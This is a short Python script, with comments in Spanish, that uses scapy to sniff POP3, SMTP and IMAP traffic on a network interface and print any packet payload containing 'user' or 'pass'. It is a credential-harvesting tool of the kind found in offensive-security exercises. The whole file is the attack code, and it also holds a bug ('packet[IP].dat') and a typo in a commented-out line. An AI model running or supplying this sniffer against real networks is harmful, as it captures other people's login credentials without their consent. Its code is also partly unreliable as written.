import sys
from scapy.all import *
#from scapy.all import *

# nuestro paquete de devolucion de llamada
def packet_callback(packet):
    if packet[TCP].payload:
        mail_packet = str(packet[TCP].payload)
                
        if "user" in mail_packet.lower() or "pass" in mail_packet.lower():
            print "[*] Server: %s" % packet[IP].dat
            print "[*] %s" % packet[TCP].payload
    
# Lanzamos el esnifer
#sniff(filter="tcp port 110 or tcp port 25 or tcp por 143", iface="Intel(R) Ethernet Connection (2) I219-LM", prn=packet_callback, store=0)

sniff(filter="tcp port 110 or tcp port 25 or tcp port 143", iface="ens33", prn=packet_callback, store=0)

